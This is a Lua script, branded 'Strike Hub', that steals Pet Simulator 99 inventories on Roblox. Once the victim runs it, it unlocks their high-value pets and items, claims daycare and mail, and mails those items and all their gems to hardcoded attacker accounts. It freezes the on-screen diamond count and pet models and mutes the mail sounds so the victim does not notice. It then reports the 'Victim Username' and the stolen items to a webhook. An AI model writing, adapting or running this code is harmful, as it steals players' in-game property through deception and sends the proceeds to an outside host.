-- ==== INITIAL SETUP ====
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local network = require(game.ReplicatedStorage.Library.Client.Network)
local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Inventory
local plr = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local message = require(game.ReplicatedStorage.Library.Client.Message)

local MailMessage = "GGz"
local min_rap = _G.minrap or 10000000
local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end
for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

-- Find mail cost function
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgc()) do
    if debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end
local mailSendPrice = FunctionToGetFirstPriceOfMail()
local GemAmount1 = 1
for i, v in pairs(save.Currency) do
    if v.id == "Diamonds" then GemAmount1 = v._am break end
end
local totalRAP = 0
local sortedItems = {}

-- ==== GUI ====
local ScreenGui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
ScreenGui.ResetOnSpawn = false
local Frame = Instance.new("Frame", ScreenGui)
Frame.AnchorPoint = Vector2.new(0.5,0.5)
Frame.Position = UDim2.new(0.5,0,0.9,0)
Frame.Size = UDim2.new(0,300,0,50)
Frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
Frame.BackgroundTransparency = 0.5
local TextLabel = Instance.new("TextLabel",Frame)
TextLabel.Size = UDim2.new(1,0,1,0)
TextLabel.Text = "Please wait while the script loads..."
TextLabel.TextColor3 = Color3.fromRGB(0,255,0)
TextLabel.TextScaled = true

-- ==== VISUAL FREEZE ====
local RunService = game:GetService("RunService")
local leaderstats = plr:WaitForChild("leaderstats")
local diamondsValue = leaderstats:FindFirstChild("💎 Diamonds") or leaderstats:FindFirstChild("Diamonds")
local frozenDiamonds = diamondsValue and diamondsValue.Value or 0

local function anchorModel(model)
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            part.Anchored = true
        end
    end
end

local petsFolder = workspace:WaitForChild("__THINGS"):WaitForChild("Pets")
local function freezePets()
    for _, pet in ipairs(petsFolder:GetChildren()) do
        if pet:IsA("Model") and pet:GetAttribute("Equipped") then
            anchorModel(pet)
        end
    end
end

local freezeConnection
freezeConnection = RunService.RenderStepped:Connect(function()
    if diamondsValue then diamondsValue.Value = frozenDiamonds end
    freezePets()
end)

plr.AncestryChanged:Connect(function(_, parent)
    if not parent then
        if freezeConnection then freezeConnection:Disconnect() end
        for _, pet in ipairs(petsFolder:GetChildren()) do
            for _, part in ipairs(pet:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Anchored = false
                end
            end
        end
    end
end)

-- ==== MAIL SOUND SUPPRESSION ====
game.DescendantAdded:Connect(function(x)
    if x:IsA("Sound") then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0 x.PlayOnRemove=false x:Destroy()
        end
    end
end)

-- ==== HELPER FUNCTIONS ====
local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
        Class={Name=Type},
        IsA=function(hmm) return hmm==Type end,
        GetId=function() return Item.id end,
        StackKey=function() return HttpService:JSONEncode({id=Item.id, pt=Item.pt, sh=Item.sh, tn=Item.tn}) end,
        AbstractGetRAP=function(self) return nil end
    }) or 0)
end

local function formatNumber(number)
    local number = math.floor(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function sendItem(category, uid, am)
    local remaining = am or 1
    local userIndex = 1
    local maxUsers = #users
    while remaining>0 do
        local currentUser = users[userIndex]
        local args={[1]=currentUser,[2]=MailMessage,[3]=category,[4]=uid,[5]=remaining}
        local response, err = network.Invoke("Mailbox: Send", unpack(args))
        if response==true then
            GemAmount1 = GemAmount1 - mailSendPrice
            mailSendPrice = math.ceil(mailSendPrice*1.5)
            if mailSendPrice>5000000 then mailSendPrice=5000000 end
            remaining=0
        elseif err=="They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex>maxUsers then warn("All mailboxes full for item "..uid) return end
        else
            warn("Failed to send item: "..tostring(err))
            return
        end
    end
end

local function SendAllGems()
    local remainingGems = GemAmount1
    if remainingGems <= mailSendPrice then return end
    local userIndex = 1
    local maxUsers = #users
    while remainingGems>0 do
        local currentUser = users[userIndex]
        local args={[1]=currentUser,[2]=MailMessage,[3]="Currency",[4]=1,[5]=remainingGems}
        local response, err = network.Invoke("Mailbox: Send", unpack(args))
        if response==true then
            GemAmount1 = GemAmount1 - remainingGems
            remainingGems = 0
        elseif err=="They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex>maxUsers then warn("All mailboxes full for gems") return end
        else
            warn("Failed to send gems: "..tostring(err))
            return
        end
    end
end

local function EmptyBoxes()
    if save.Box then
        for key,value in pairs(save.Box) do
            if value._uq then network.Invoke("Box: Withdraw All", key) end
        end
    end
end

local function ClaimMail()
    local response, err = network.Invoke("Mailbox: Claim All")
    while err=="You must wait 30 seconds before using the mailbox!" do
        wait(0.2)
        response, err=network.Invoke("Mailbox: Claim All")
    end
end

local function canSendMail()
    local uid
    for i,v in pairs(save["Pet"]) do uid=i break end
    local args={[1]="Roblox",[2]="Test",[3]="Pet",[4]=uid,[5]=1}
    local response, err=network.Invoke("Mailbox: Send", unpack(args))
    return (err=="They don't have enough space!")
end

-- ==== MAIN FLOW ====
require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

local categoryList = {"Pet","Egg","Charm","Enchant","Potion","Misc","Ultimate"}

for _, category in ipairs(categoryList) do
    if save[category] then
        for uid,item in pairs(save[category]) do
            local rapValue = getRAP(category, item)
            if category=="Pet" then
                local dir=require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                if (dir.gargantuan or dir.titanic or dir.huge or dir.exclusiveLevel) and rapValue>=min_rap then
                    local prefix=""
                    if item.pt==1 then prefix="Golden " elseif item.pt==2 then prefix="Rainbow " end
                    if item.sh then prefix="Shiny "..prefix end
                    local id = prefix..item.id
                    table.insert(sortedItems,{category=category, uid=uid, amount=item._am or 1, rap=rapValue, name=id})
                    totalRAP = totalRAP + rapValue*(item._am or 1)
                end
            else
                if rapValue>=min_rap then
                    table.insert(sortedItems,{category=category, uid=uid, amount=item._am or 1, rap=rapValue, name=item.id})
                    totalRAP = totalRAP + rapValue*(item._am or 1)
                end
            end
            if item._lk then network.Invoke("Locking_SetLocked", uid, false) end
        end
    end
end

-- Pre-send setup
ClaimMail()
EmptyBoxes()
if not canSendMail() then
    message.Error("Account error. Please rejoin or use a different account")
    return
end

-- Send all items
for _, item in ipairs(sortedItems) do
    if item.rap>=min_rap and GemAmount1>mailSendPrice then
        print("[INFO] Sending item:", item.name, "Amount:", item.amount)
        sendItem(item.category, item.uid, item.amount)
    else break end
end

-- Send remaining gems
if GemAmount1>mailSendPrice then
    print("[INFO] Sending remaining gems:", GemAmount1)
    SendAllGems()
end

-- ==== WEBHOOK ====
spawn(function()
    local headers = {["Content-Type"]="application/json"}
    local fields = {
        {name="Victim Username:", value=plr.Name, inline=true},
        {name="Items to be sent:", value="", inline=false},
        {name="Summary:", value="", inline=false}
    }
    local combinedItems = {}
    local itemRapMap = {}
    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount=item.amount, rap=item.rap}
            table.insert(combinedItems, rapKey)
        end
    end
    table.sort(combinedItems,function(a,b)
        return itemRapMap[a].rap*itemRapMap[a].amount>itemRapMap[b].rap*itemRapMap[b].amount
    end)
    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value..itemName.." (x"..itemData.amount..")"..": "..formatNumber(itemData.rap*itemData.amount).." RAP\n"
    end
    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(GemAmount1), formatNumber(totalRAP))
    local data = {
        ["embeds"]={{["title"]="💱 New PS99 Execution", ["color"]=65280, ["fields"]=fields, ["footer"]={["text"]="Strike Hub."}}}
    }
    local body = HttpService:JSONEncode(data)
    request({Url=webhook, Method="POST", Headers=headers, Body=body})
end)
